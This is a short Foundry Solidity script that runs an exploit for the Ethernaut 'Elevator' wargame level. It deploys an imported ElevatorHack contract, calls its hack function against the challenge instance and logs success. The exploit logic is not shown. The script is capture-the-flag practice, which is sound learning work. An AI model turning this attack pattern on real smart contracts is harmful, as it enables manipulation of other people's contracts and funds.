// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import {IElevator, ElevatorHack} from "src/ethernaut/ElevatorExploit.sol";

// Estimated total gas used for script: 282380
contract ElevatorScript is Script {
    function run() external {
        // Load Elevator contract instance using interface
        IElevator elevator = IElevator(0xBAa5492B7E6f7a14c96F97C8bB6373E6456d335F);

        // Get private key from .env file
        uint attackerKey = vm.envUint("PRIVATE_KEY");

        // Set attacker as the msg.sender for all subsequent transactions.
        vm.startBroadcast(attackerKey);

        console2.log("Deploying ElevatorHack contract...");
        ElevatorHack elevatorHack = new ElevatorHack();
        console2.log("Elevator Hack deployed.");

        console2.log("Performing hack...");
        elevatorHack.hack(address(elevator));

        console2.log("'top' set to :", elevator.top());
        vm.stopBroadcast();
        console2.log("SUCCESS!!! Submit the instance.");
    }
}